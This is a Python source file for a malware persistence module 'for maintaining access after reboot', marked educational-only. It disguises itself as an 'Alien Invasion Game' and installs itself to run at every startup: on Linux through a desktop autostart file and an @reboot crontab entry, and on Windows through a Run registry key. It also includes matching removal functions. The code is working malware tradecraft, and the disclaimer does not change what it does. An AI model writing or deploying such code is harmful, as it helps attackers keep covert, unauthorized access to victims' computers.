"""
Persistence module for maintaining access after reboot
WARNING: For educational purposes only in controlled VM environments
"""
import os
import sys
import platform
from pathlib import Path
import shutil

class PersistenceManager:
    def __init__(self):
        self.system = platform.system()
        self.script_path = os.path.abspath(sys.argv[0])
        
    def install_persistence(self):
        """Install persistence based on OS"""
        if self.system == 'Linux':
            return self._install_linux_persistence()
        elif self.system == 'Windows':
            return self._install_windows_persistence()
        else:
            return False
    
    def _install_linux_persistence(self):
        """Install persistence on Linux using systemd or cron"""
        try:
            # Method 1: Desktop autostart (user-level)
            autostart_dir = Path.home() / '.config' / 'autostart'
            autostart_dir.mkdir(parents=True, exist_ok=True)
            
            desktop_file = autostart_dir / 'alien_invasion.desktop'
            
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=Alien Invasion Game
Exec=python3 {self.script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            # Method 2: Cron job as backup
            cron_command = f"@reboot python3 {self.script_path}"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_command}") | crontab -')
            
            return True
        except Exception as e:
            return False
    
    def _install_windows_persistence(self):
        """Install persistence on Windows using Registry"""
        try:
            import winreg
            
            # Add to Windows startup registry
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "AlienInvasion", 0, winreg.REG_SZ, f'python "{self.script_path}"')
            winreg.CloseKey(key)
            
            return True
        except Exception as e:
            return False
    
    def remove_persistence(self):
        """Remove all persistence mechanisms"""
        if self.system == 'Linux':
            return self._remove_linux_persistence()
        elif self.system == 'Windows':
            return self._remove_windows_persistence()
        return False
    
    def _remove_linux_persistence(self):
        """Remove Linux persistence"""
        try:
            # Remove desktop autostart
            autostart_file = Path.home() / '.config' / 'autostart' / 'alien_invasion.desktop'
            if autostart_file.exists():
                autostart_file.unlink()
            
            # Remove from crontab
            os.system(f'crontab -l | grep -v "{self.script_path}" | crontab -')
            
            return True
        except Exception as e:
            return False
    
    def _remove_windows_persistence(self):
        """Remove Windows persistence"""
        try:
            import winreg
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "AlienInvasion")
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
            
            return True
        except Exception as e:
            return False
